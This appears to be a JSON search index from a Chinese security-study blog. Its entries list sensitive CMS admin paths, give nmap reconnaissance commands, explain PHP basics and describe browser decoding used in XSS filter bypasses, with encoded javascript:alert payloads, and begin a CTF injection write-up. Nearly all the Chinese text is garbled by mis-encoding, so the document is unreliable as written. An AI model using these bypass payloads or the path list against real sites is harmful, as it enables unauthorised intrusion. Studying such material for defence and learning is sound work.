php/temp/compiled/brands.lbi.php/temp/compiled/help.lbi.php/temp/compiled/goods_gallery.lbi.php/temp/compiled/comments.lbi.php/temp/compiled/myship.lbi.php/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php/includes/modules/cron/auto_manage.php/includes/modules/cron/ipdel.php PHP16812345/admin/inc/hack/count.php?job=list/admin/inc/hack/search.php?job=getcode/admin/inc/ajax/bencandy.php?job=do/cache/MysqlTime.txt/PHPcms2008-sp4 CMSeasy123/lib/mods/celive/menu_top.php/lib/default/ballot_act.php/lib/default/special_act.php å‚è€ƒ:https://my.oschina.net/u/4324366/blog/3442695","link":"/2021/02/19/window-linux%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E6%95%B4%E7%90%86/"},{"title":"å›½ç§‘å®‰å…¨æ¸—é€æµ‹è¯•ç¬¬ä¸€è¯¾","text":"å›½ç§‘å®‰å…¨ç¬¬ä¸€è¯¾æ¸—é€æµ‹è¯•æ€è·¯ï¼š1.ä¿¡æ¯æ”¶é›†2.æ¼æ´æŒ–æ˜3.æ¼æ´åˆ©ç”¨4.è¾“å‡ºæ¸—é€æµ‹è¯•æŠ¥å‘Šæ¸—é€æµ‹è¯•ä¹‹ä¿¡æ¯æ”¶é›† 1.åŸºæœ¬ä¿¡æ¯ã€‹åŸŸåä¿¡æ¯ ä¾‹:goktech.cn å·¥å…·:ç«™é•¿ä¹‹å®¶ Layerå·¥å…·ã€‹å­åŸŸå ä¾‹:bbs.goktech.cnã€‹ipåœ°å€ã€‹åŒipçš„å…¶ä»–ç½‘ç«™ä¿¡æ¯(æ—ç«™) â€“ç«™é•¿ä¹‹å®¶ã€‹åŒç½‘æ®µçš„å…¶ä»–æœåŠ¡å™¨ä¿¡æ¯ï¼ˆcæ®µï¼‰ã€‹ç«¯å£:(http80ã€https443)ã€445ï¼ˆå…±äº«ç«¯å£ï¼ˆå…±äº«æ–‡ä»¶å¤¹ï¼‰ï¼‰ã€‹æœåŠ¡(webæœåŠ¡)ï¼ŒæœåŠ¡ç‰ˆæœ¬ã€‹ä¿¡æ¯æ³„éœ²â€”â€”github.com(å¼€æºä»£ç ç½‘ç«™) 2.osæ“ä½œç³»ç»Ÿç‰ˆæœ¬â€”â€”Nmapå·¥å…·ï¼ˆkaliè¦æœ‰ipåœ°å€ï¼Œå¹¶ä¸”å’Œä½ çš„ç›®æ ‡æœåŠ¡å™¨ç½‘ç»œå¯è¾¾ï¼ˆpingé€šï¼‰ï¼ŒåŒºåˆ†å¤§å°å†™ï¼‰nmap -sn +åŸŸå/ç½‘æ®µ/ipåœ°å€ //-sP ç”¨pingçš„æ–¹å¼åˆ¤æ–­æ˜¯å¦æœ‰å­˜è´§ä¸»æœºï¼Œä¸æ‰«é¢ç«¯å£//-sT ä½¿ç”¨TCPè¿›è¡Œè¿æ¥ï¼Œå¯¹ç›®æ ‡ä¸»æœºæ‰€æ¬²ç«¯å£è¿›è¡Œå®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¦‚æœæˆåŠŸå»ºç«‹è¿æ¥åˆ™è¯´æ˜ç«¯å£å¼€æ”¾**(TCPä¸‰æ¬¡æ¡æ‰‹)**//-sUï¼šä½¿ç”¨UDPæ•°æ®åŒ…ç»è¡Œæ‰«æï¼Œè¿”å›UDPæŠ¥æ–‡ï¼Œåˆ™ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œè¿”å›ä¸å¯è¾¾åˆ™å¤„äºè¿‡æ»¤çŠ¶æ€nmap -sT -O ç›®æ ‡ipåœ°å€ï¼ˆä½¿ç”¨sTæ–¹å¼æ‰«æç›®æ ‡ä¸»æœºä¿¡æ¯ï¼ˆOä»£è¡¨æ£€æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼‰ï¼‰-p+ç«¯å£å·: æ‰«ææŒ‡å®šç«¯å£ä¾‹å­ï¼šnmap -sS -p 80,443 +ipåœ°å€-sVï¼šæœåŠ¡ç‰ˆæœ¬å¯¼å‡ºåˆ°æŒ‡å®šæ–‡æœ¬ï¼šnmap -sT -p 3389 â€“open ip -oN 3.txtcat 3.txt linuxã€windã€mac3.webä¸­é—´ä»¶(webç¨‹åºï¼Œç”¨æ¥æä¾›ç½‘é¡µæœåŠ¡)ç±»å‹:iisï¼Œapacheã€nginxã€weblogic4.æ•°æ®åº“ä»¥åŠç‰ˆæœ¬ç±»å‹ã€ç‰ˆæœ¬:mysql,mssql,oracle,access5.åç«¯çš„è„šæœ¬ç±»å‹ã€ç‰ˆæœ¬phpã€jspã€aspã€aspx åŸŸåhttps://raw.githubusercontent.com/Hwwg/myphoto/master/20210125194711.pnghttp://whois.chinaz.com/goktech.cnå­åŸŸåhttps://phpinfo.me/domain/","link":"/2021/01/25/%E5%9B%BD%E7%A7%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%AC%E4%B8%80%E8%AF%BE/"},{"title":"æ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ ","text":"","link":"/2021/01/30/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/"},{"title":"PHPå­¦ä¹ ","text":"PHPçš„åŸºæœ¬è¯­æ³•123&lt;?phpPHP ä»£ç ?&gt; å±•ç¤ºä¸€ä¸‹å®ä¾‹ 123&lt;?phpecho &quot;Hello World!&quot;;?&gt; PHPçš„å˜é‡ä½œç”¨åŸŸå˜é‡çš„ä½œç”¨åŸŸæ˜¯è„šæœ¬ä¸­å˜é‡å¯è¢«å¼•ç”¨/ä½¿ç”¨çš„éƒ¨åˆ†ã€‚ PHP æœ‰å››ç§ä¸åŒçš„å˜é‡ä½œç”¨åŸŸï¼š local global static parameter ç€é‡è®²ä¸€ä¸‹ globalå’Œstaticå§é¦–å…ˆæ˜¯globalï¼Œåœ¨å‡½æ•°å†…éƒ¨æ–½åŠ è¯¥å‘½ä»¤ï¼Œå˜é‡åœ¨å‡½æ•°å†…éƒ¨å¯ä»¥å¼•ç”¨å‡½æ•°å¤–éƒ¨çš„å€¼ 12345678910111213&lt;?php$x=5;$y=10;function myTest(){ global $x,$y; $y=$x+$y;}myTest();echo $y; // è¾“å‡º 15?&gt; æ¥ä¸‹æ¥æ˜¯staticå‘½ä»¤ï¼Œå°±æ˜¯ä½ åœ¨å¯¹ä¸€ä¸ªå˜é‡æ–½åŠ è¯¥å‘½ä»¤åï¼Œè¯¥å˜é‡çš„å€¼å‘ç”Ÿæ”¹å˜åï¼Œåœ¨ä¸‹æ¬¡ä½¿ç”¨è¯¥å˜é‡æ—¶ï¼Œè¿™ä¸ªå€¼çš„é‡å·²ç»ä¸åœ¨æ˜¯åˆå§‹é‡ï¼Œè€Œæ˜¯å˜åŒ–åçš„é‡ 12345678910111213&lt;?phpfunction myTest(){ static $x=0; echo $x; $x++; echo PHP_EOL; // æ¢è¡Œç¬¦}myTest();myTest();myTest();?&gt; è¾“å‡ºçš„å€¼æ˜¯0 1 2 å½“æˆ‘æŠŠstaticè¿™ä¸ªæŒ‡ä»¤åˆ é™¤åï¼Œè¾“å‡ºçš„å€¼å°±å˜æˆäº†000 æœ€åæ˜¯echoå’Œprintè¾“å‡ºè¯­å¥æ ¼å¼éƒ½æ˜¯â€è¾“å‡ºå†…å®¹â€ï¼Œä¸è¿‡åŒºåˆ«åœ¨äºï¼Œechoå¯ä»¥è¿™æ ·:echoâ€è¾“â€â€å‡ºâ€â€ä»£ç â€ï¼Œè€Œprint åªèƒ½ä¸€æ¬¡æ€§è¾“å‡º","link":"/2020/10/06/PHP%E5%AD%A6%E4%B9%A0/"},{"title":"ç”±xsså¼•å‘çš„å¯¹äºæµè§ˆå™¨è§£ç å’Œç¼–ç æµç¨‹è®¤è¯†","text":"å‰è¨€:çœ‹åˆ°xssçš„ç¼–ç ç»•è¿‡å†™æ³•åï¼Œå…¶å®æ„Ÿè§‰å¾ˆæ‡µï¼Œ ä¸çŸ¥é“ä¸ºå•¥ä»–è¦è¿™æ ·å†™ï¼Œæ•…å†³å®šå»å­¦ä¹ ä¸€ä¸‹æµè§ˆå™¨è§£ç å’Œç¼–ç çš„è¿‡ç¨‹ æµè§ˆå™¨çš„å¤§è‡´å·¥ä½œæµç¨‹æµè§ˆå™¨æœ€æ—©å¼€å§‹è§£æhtmlï¼Œå°†æ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸Šçš„DOMèŠ‚ç‚¹ï¼Œç„¶åæ­¤æ—¶è¿˜æ˜¯æ— æ³•è¯†åˆ«å‡ºå“ªäº›è¢«å®ä½“ç¼–ç ï¼Œæ¥ä¸‹æ¥å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰å¯ä»¥è¯†åˆ«å“ªäº›ä¸ºå®ä½“ç¼–ç ï¼Œå¹¶å°†å…¶è§£ç ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šï¼Œjavascript DOM APIå‚ä¸è¿›æ¥ï¼Œå¯ä»¥å¯¹DOMæ ‘è¿›è¡Œä¿®æ”¹ï¼Œæ”¹å˜DOMæ ‘çš„ç»“æ„å’Œå†…å®¹ï¼Œè€ŒCSSä¸»è¦è´Ÿè´£è§£æå¤–éƒ¨CSSæ–‡ä»¶å’Œstyle çš„æ ·å¼æ ‡ç­¾ DOMæ ‘å‚è€ƒ:https://zh.javascript.info/dom-nodes åœ¨çŸ¥é“å¤§è‡´çš„ä¸€ä¸ªå·¥ä½œæµç¨‹åï¼Œåˆ†æå…¶ä¸­çš„ç¼–ç è§£ç è¿‡ç¨‹: è§£ææµ:åœ¨çŸ¥é“å®Œå¤§è‡´å·¥ä½œæµç¨‹åï¼Œæˆ‘ä»¬ç†ä¸€ä¸‹å„ä¸ªè§£æå™¨å‘æŒ¥ä½œç”¨çš„é¡ºåº: html-&gt;url-&gt;javascript1&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼šé¦–å…ˆhtmlè§£æå™¨è¿›è¡Œè§£æï¼Œå¹¶è¿›è¡Œå®ä½“ç¼–ç çš„è§£ç ï¼Œæ¥ä¸‹æ¥å¦‚æœåœ¨è¿™ä¸ªuserinputä¸­è®¾è®¡URLå†…å®¹ï¼Œé‚£ä¹ˆurlè§£æå™¨ä¼šå‘å…ˆå‘æŒ¥ä½œç”¨ï¼Œè¿›è¡ŒURLè§£ç ï¼Œå¦‚æœURLèµ„æºæ˜¯JavaScriptç±»å‹ï¼ŒJavaScriptè§£æå™¨å°†ä¼šå‘æŒ¥ä½œç”¨ï¼Œè¿›è¡Œè§£ç  html-&gt;javascript-&gt;url1&lt;a href=# onclick=&quot;window.open('UserInput')&quot;&gt;&lt;/a&gt; åœ¨è¿™é‡Œ è¿˜æ˜¯å…ˆhtmlè¿›è¡Œè§£æï¼Œæ¥ä¸‹æ¥onclickçš„å€¼æ˜¯æœ‰JavaScriptè§£æå™¨è¿›è¡Œè§£æå¤„ç†çš„ï¼Œå¤„ç†çš„æ˜¯window.openä¸­çš„inputï¼Œæ­¤æ—¶è®¾è®¡URLçš„å‚æ•°ï¼ŒURLè§£æå™¨å°±ä¼šå¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡Œè§£ç ï¼Œå¹¶å°†å…¶ç»“æœä¼ å›ç»™JavaScript HTMLè§£æHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ªâ€˜&lt;â€™ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿâ€˜/â€™ï¼‰ç¬¦å·å°±ä¼šè¿›å…¥æ ‡ç­¾å¼€å§‹ç¬¦å·ï¼Œç„¶åè½¬å˜åˆ°æ ‡ç­¾åçŠ¶æ€ï¼Œæœ€åæ˜¯æ•°æ®çŠ¶æ€å¹¶é‡Šæ–¹å½“å‰æ ‡ç­¾çš„tokenï¼Œå½“è§£æå™¨å¤„äºæ•°æ®çŠ¶æ€æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾ä¸€ä¸ªtokenã€‚åœ¨å‰é¢çš„å·¥ä½œæµç¨‹ä¸­æˆ‘ä»¬è¯´åˆ°ï¼Œåœ¨å»ºç«‹èµ·DOMæ ‘åä¼šè¯†åˆ«å“ªäº›ä¸ºå®ä½“ç¼–ç ï¼Œå¹¶å°†å…¶è§£ç ã€‚è¿™é‡Œæˆ‘ä»¬å°†æ·±å…¥è®²è§£ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹:å­—ç¬¦å®ä½“åˆ†ä¸ºä¸‰ç§:1.æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨2.RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨3.å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨è¿™äº›çŠ¶æ€ä¸­HTMLå­—ç¬¦å®ä½“å°†ä¼šä»â€&amp;#..â€å½¢å¼ç¼–ç ï¼Œå¯¹åº”çš„è§£ç å­—ç¬¦ä¼šè¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­,ä¾‹å¦‚:â€&lt;â€è¢«ç¼–ç ä¸ºâ€œ&amp;#60â€ã€‚å½“è§£æå™¨é‡åˆ°&amp;å­—ç¬¦ï¼Œå®ƒä¼šçŸ¥é“è¿™æ˜¯â€æ•°æ®çŠ¶æ€çš„å­—ç¬¦å¼•ç”¨â€ï¼Œå› æ­¤ä¼šæ¶ˆè€—ä¸€ä¸ªå­—ç¬¦å¼•ç”¨ï¼Œå¹¶é‡Šæ”¾å‡ºç›¸åº”çš„tokenï¼Œä½†æ˜¯è¿™é‡Œçš„&lt;çš„tokenä¸ä¼šè¢«ç†è§£æ˜¯æ ‡ç­¾çš„å¼€å§‹ï¼ŒåŸå› æ˜¯è§£æå™¨è§£æè¿™ä¸ªè¿™ä¸ªå­—ç¬¦å¼•ç”¨åä¸ä¼šè½¬æ¢åˆ°æ ‡ç­¾å¼€å§‹çŠ¶æ€ã€‚å­—ç¬¦å®ä½“ï¼šå­—ç¬¦å®ä½“æ˜¯ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œå®ƒå®šä¹‰äº†ä¸€èˆ¬æ— æ³•åœ¨æ–‡æœ¬å†…å®¹ä¸­è¾“å…¥çš„å•ä¸ªå­—ç¬¦æˆ–ç¬¦å·ã€‚ä¸€ä¸ªå­—ç¬¦å®ä½“ä»¥ä¸€ä¸ª&amp;ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€ä¸€ä¸ªé¢„å®šä¹‰çš„å®ä½“çš„åç§°ï¼Œæˆ–æ˜¯ä¸€ä¸ª#ç¬¦å·ä»¥åŠå­—ç¬¦çš„åè¿›åˆ¶æ•°å­—HTMLå­—ç¬¦å®ä½“ ä¸€ç‚¹æ€è€ƒ:å½“æˆ‘ä»¬è¾“å…¥çš„xssè„šæœ¬è¯­å¥ä¸­&lt;&gt;è¢«è½¬ä¹‰æˆ&amp;#60;çš„æ—¶å€™ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„xssè„šæœ¬å°†ä¸èµ·ä½œç”¨ã€‚ RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼šè¿™é‡Œè¦æä¸€ä¸‹RCDATAçš„æ¦‚å¿µã€‚è¦äº†è§£ä»€ä¹ˆæ˜¯RCDATAï¼Œæˆ‘ä»¬å…ˆè¦äº†è§£å¦ä¸€ä¸ªæ¦‚å¿µã€‚åœ¨HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š 1ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚&lt;area&gt;,&lt;br&gt;,&lt;base&gt;ç­‰ç­‰ 2åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰&lt;script&gt;å’Œ&lt;style&gt; 3RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰&lt;textarea&gt;å’Œ&lt;title&gt; 4å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´  5åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ äº”ç±»å…ƒç´ çš„åŒºåˆ«å¦‚ä¸‹ï¼š 1ç©ºå…ƒç´ ï¼Œä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ï¼‰ã€‚ 2åŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€‚ 3RCDATAå…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚ 4å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š 5åŸºæœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š åœ¨RCDATAçŠ¶æ€ä¸­ï¼Œå”¯ä¸€èƒ½å¤Ÿè¢«è§£æè¿›å…¥æ ‡ç­¾å¼€å§‹çŠ¶æ€çš„åªæœ‰&lt;textarea&gt;å’Œ&lt;text&gt;ç­‰RCDATAå…ƒç´ ï¼Œä»¥ä¸ºè¿™å¦‚æœæœ‰ä¸€ä¸ªè¯­å¥æ˜¯ï¼š 1&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; è¿™ä¸ªè¯­å¥å½“ä¸­çš„alertæ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ï¼Œå› ä¸º&lt;script&gt;ä¸ä¼šè¢«è§£æä¸ºæ ‡ç­¾å¼€å§‹çŠ¶æ€ CDATAå…ƒç´ ã€‚ä»»ä½•åœ¨CDATAå…ƒç´ ä¸­çš„å†…å®¹å°†ä¸ä¼šè§¦å‘è§£æå™¨åˆ›å»ºå¼€å§‹æ ‡ç­¾ã€‚é—­åˆCDATAå…ƒç´ çš„æ ‡å¿—æ˜¯â€œ]]&gt;â€åºåˆ—ã€‚å› æ­¤å¦‚æœç”¨æˆ·æƒ³é€ƒå‡ºCDATAå…ƒç´ ï¼Œå°±è¦ç”¨æœªç»ä»»ä½•ç¼–ç çš„â€œ]]&gt;â€åºåˆ—ï¼Œä¸ç„¶æ˜¯ä¸ä¼šé€ƒå‡ºCDATAå…ƒç´ çš„ã€‚ URLè§£æ12 &lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;URL encoded &quot;javascript:alert(1)&quot; 1234&lt;ahref=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot; 12&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;URL encoded &quot;:&quot; ä¸Šé¢è¿™ä¸‰æ®µä»£ç ä¸­ åªæœ‰ä¸­é—´é‚£æ®µä¼šæˆåŠŸå¼¹çª—ï¼ŒåŸå› æ˜¯:URLèµ„æºç±»å‹å¿…é¡»æ˜¯ASCIIå­—æ¯ï¼Œä¸ç„¶å°±ä¼šè¿›å…¥æ— ç±»å‹çŠ¶æ€ï¼Œè¯¥è§„åˆ™åŒæ ·é€‚åº”äºé‚£ä¸ªâ€œ:â€å·,æˆ‘ä»¬çŸ¥é“htmlç»è¿‡è§£ææ–‡æœ¬ï¼Œå¹¶ä¼šå¯¹å…¶å­—ç¬¦å®ä½“è¿›è¡Œè§£ç ï¼Œè€Œåœ¨ç¬¬ä¸€æ®µå’Œç¬¬ä¸‰æ®µJavaScriptæ²¡æœ‰è¢«è§£ç ï¼Œæ‰€ä»¥ä¸ä¼šè¢«URLè§£æå™¨æ‰€è¯†åˆ«ï¼Œæ‰€ä»¥ä¸ä¼šè¢«è§£ç ã€‚ javascriptè§£æåœ¨scriptå—ä¸­çš„å­—ç¬¦å®ä½“ç¼–ç ä¸ä¼šè¢«è§£æ:12&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;Character entity encoded alert(9); jsæ”¯æŒUnicodeè§£ææ‰€åœ¨ä½ç½®å­—ç¬¦ä¸²ä¸­å½“Unicodeè½¬ä¹‰åºåˆ—å­˜åœ¨äºå­—ç¬¦ä¸²ä¸­æ—¶ï¼Œå®ƒåªä¼šè¢«è§£é‡Šä¸ºæ­£è§„å­—ç¬¦ï¼Œè€Œä¸æ˜¯å•å¼•å·ï¼ŒåŒå¼•å·æˆ–è€…æ¢è¡Œç¬¦è¿™äº›èƒ½å¤Ÿæ‰“ç ´å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡çš„å­—ç¬¦ã€‚è¿™é¡¹å†…å®¹æ¸…æ¥šåœ°å†™åœ¨ECMAScriptä¸­ã€‚å› æ­¤ï¼ŒUnicodeè½¬ä¹‰åºåˆ—å°†æ°¸è¿œä¸ä¼šç ´ç¯å­—ç¬¦ä¸²ä¸Šä¸‹æ–‡ï¼Œå› ä¸ºå®ƒä»¬åªèƒ½è¢«è§£é‡Šæˆå­—ç¬¦ä¸²å¸¸é‡ã€‚ æ ‡è¯†ç¬¦åç§°ä¸­ä»€ä¹ˆæ˜¯æ ‡è¯†ç¬¦ï¼Ÿjavaè¯­è¨€ä¸­ï¼Œå¯¹äºå˜é‡ï¼Œå¸¸é‡ï¼Œå‡½æ•°ï¼Œè¯­å¥å—ä¹Ÿæœ‰åå­—ï¼Œæˆ‘ä»¬ç»Ÿç»Ÿç§°ä¹‹ä¸ºæ ‡è¯†ç¬¦Javaæ ‡è¯†ç¬¦ç±»ä¼¼äºæˆ‘ä»¬Cè¯­è¨€ä¸­å®šä¹‰çš„å˜é‡ï¼Œå®šä¹‰è§„åˆ™å¦‚ä¸‹:https://blog.csdn.net/shuaigexiaobo/article/details/86617080å¦‚æœunicodeè½¬ä¹‰åºåˆ—å‡ºç°åœ¨æ ‡è¯†ç¬¦ä¸­ï¼Œå®ƒä¼šè¢«è§£ç å¹¶è§£é‡Šä¸ºæ ‡è¯†ç¬¦çš„ä¸€éƒ¨åˆ† 12&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;Unicode Escape sequence encoded alert æ§åˆ¶å­—ç¬¦ä¸­ä»€ä¹ˆæ˜¯æ§åˆ¶å­—ç¬¦ï¼Ÿä¾‹å¦‚å•å¼•å·ã€åŒå¼•å·ã€åœ†æ‹¬å·ç­‰ï¼Œè¿™é‡Œå¯ä»¥ç®€å•ç†è§£ä¸ºCè¯­è¨€ä¸­æˆ‘ä»¬æ‰“printf(â€œâ€)é‡Œé¢çš„è¿™ä¸ªåŒå¼•å·https://www.netinbag.com/cn/internet/what-is-a-control-character.htmlåœ¨unicodeè½¬ä¹‰åºåˆ—è¡¨ç¤ºä¸€ä¸ªæ§åˆ¶å­—ç¬¦æ—¶ï¼Œå®ƒä»¬å°†ä¸ä¼šè¢«è§£é‡Šæˆä¸€ä¸ªæ§åˆ¶å­—ç¬¦ï¼Œè€Œæ˜¯è¢«è§£ç è§£æä¸ºæ ‡è¯†ç¬¦åç§°æˆ–è€…å­—ç¬¦ä¸²å¸¸é‡ã€‚ä¾‹å­ï¼š 123&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt;Unicode Escape sequence encoded alert(11)//è¿™é‡Œä¸ä¼šå¼¹çª—æ˜¯å› ä¸ºï¼Œè¿™é‡Œçš„æ§åˆ¶å­—ç¬¦()è¢«è§£ç åå¤±å»å…¶æ§åˆ¶å­—ç¬¦çš„å±æ€§äº† 123&lt;script&gt;alert('13\\u0027)&lt;/script&gt;Unicode escape sequence encoded â€™//è¿™é‡Œçš„æ˜¯å› ä¸ºæ§åˆ¶å­—ç¬¦''è¢«è½¬ä¹‰äº† 123&lt;button onclick=&quot;confirm('8\\u0027);&quot;&gt;Button&lt;/button&gt;Unicode escape sequence encoded 'åŒæ ·å•å¼•å· 1234&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt;Unicode Escape sequence encoded alert and 12 è¿™ä¸ªä¹Ÿä¸è®¸ è§£ç åç¼ºå°‘å•å¼•å·&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074('\\u0031\\u0032')&lt;/script&gt;è¿™æ ·å°±å¯¹äº† å‚è€ƒhttp://test.attacker-domain.com/browserparsing/answers.txthttp://bobao.360.cn/learning/detail/292.htmlhttps://www.hackersb.cn/hacker/85.htmlhttps://xz.aliyun.com/t/5863https://zh.javascript.info/dom-nodeshttp://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/ å°ç»“èº«ä¸ºä¸€ä¸ªèœé¸Ÿï¼Œæ„Ÿè§‰ç†æ¸…æ¥šè¿™äº›ä»¥åï¼Œå¯¹äºä¹‹å‰XSSåšå®¢å†™çš„ç¼–ç ç»•è¿‡ç»ˆäºèƒ½ä½“ä¼šä¸€äº›äº†ï¼Œæœç„¶å­¦ä¸œè¥¿è¿˜æ˜¯ä¸èƒ½å­¦çš„ä¸æ¸…ä¸æ¥šçš„","link":"/2021/01/29/%E7%94%B1xss%E5%BC%95%E5%8F%91%E7%9A%84%E5%AF%B9%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E7%A0%81%E5%92%8C%E7%BC%96%E7%A0%81%E6%B5%81%E7%A8%8B%E8%AE%A4%E8%AF%86/"},{"title":"è™ç¬¦æ¯”èµ›wpâ€”â€”fat freeæ¡†æ¶æ³¨å…¥æ¼æ´å®¡è®¡å­¦ä¹ ","text":"å‰è¨€èµ›åå¤ç°å­¦ä¹ å­¦ä¹ ï¼Œä»Šå¤©ä¸»è¦å­¦ä¹ ä¸€ä¸‹é€šè¿‡å®¡è®¡æ„é€ æ³¨å…¥è¯­å¥ ä»£ç å®¡è®¡åŸºæœ¬æ­¥éª¤å…¥å£æ–‡ä»¶â€”â€”&gt;æ–‡ä»¶ç›‘æ§â€”â€”&gt;æ­£å¼å®¡è®¡ æ­£å¼å®¡è®¡æ­¥éª¤æˆ‘æŠŠå®¡è®¡åˆ†ä¸ºå®‰è£…å‰å’Œå®‰è£…åä¸¤ä¸ªéƒ¨åˆ†ï¼Œå®‰è£…å‰å®¡å®Œäº†ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹çœ‹ç½‘ç«™çš„å…¶ä»–æ–‡ä»¶æ˜¯å¦å­˜åœ¨æ¼æ´äº†ï¼Œè¿™ä¸ªæ—¶å€™ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§å®¡è®¡æ–¹å¼ï¼š 1.é€šè¿‡å±é™©å‡½æ•°é€†æ¨æ˜¯å¦ç”¨æˆ·å¯æ§2.é€šè¯»æ‰€æœ‰ä»£ç 3.é»‘ç›’+ç™½ç›’ æˆ‘ä¸€èˆ¬éƒ½ä¼šç”¨ç¬¬ä¸€ç§æˆ–è€…ç¬¬äºŒç§æ–¹å¼ï¼Œç¬¬ä¸€ç§æ–¹å¼èƒ½å¤Ÿå¿«é€Ÿçš„æ‰¾åˆ°æ¼æ´ä½†æ˜¯æ¼çš„å¯èƒ½ä¼šå¤šï¼Œç¬¬äºŒç§æ–¹å¼ä¸€èˆ¬ç”¨åœ¨è§„æ¨¡æ¯”è¾ƒå°çš„cmsï¼Œå› ä¸ºæ–‡ä»¶è¾ƒå°‘ï¼Œæ‰€ä»¥ä»£ç å…¨çœ‹äº†ä¹ŸèŠ±ä¸äº†å¤šå°‘åŠŸå¤«ï¼Œç¬¬ä¸‰ç§æˆ‘å¾ˆå°‘ç”¨ï¼Œæˆ‘è§‰å¾—è¿™æ˜¯æ–°æ‰‹å®¡è®¡çš„ç¼ºç‚¹ï¼Œå…¶å®æ›´åº”è¯¥é»‘ç›’+ç™½ç›’ä¸€èµ·ç”¨çš„ï¼Œå› 